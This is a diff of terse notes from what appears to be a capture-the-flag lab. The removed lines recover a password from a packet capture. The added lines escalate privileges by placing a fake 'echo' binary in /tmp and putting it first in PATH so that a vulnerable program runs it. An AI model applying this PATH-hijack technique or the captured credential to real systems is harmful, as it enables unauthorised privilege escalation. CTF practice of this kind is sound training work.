@@ -1,5 +1,6 @@
-scp -P 4242 level02@192.168.1.28:~/level02.pcap ./.test.pcap
-Wireshark(.test.pcap) > result
-decode_stream_hex(result)
-mdp : ft_wandr...NDRel.L0L (. = backspace)
-su flag02 (ft_waNDReLOL)
+cat level03
+# /usr/bin/env echo Exploit me
+chmod 777 level03/Ressources/echo
+scp -P 4242 level03/Ressources/echo level03@192.168.1.28:/tmp
+export PATH=/tmp:${PATH}
+./level03
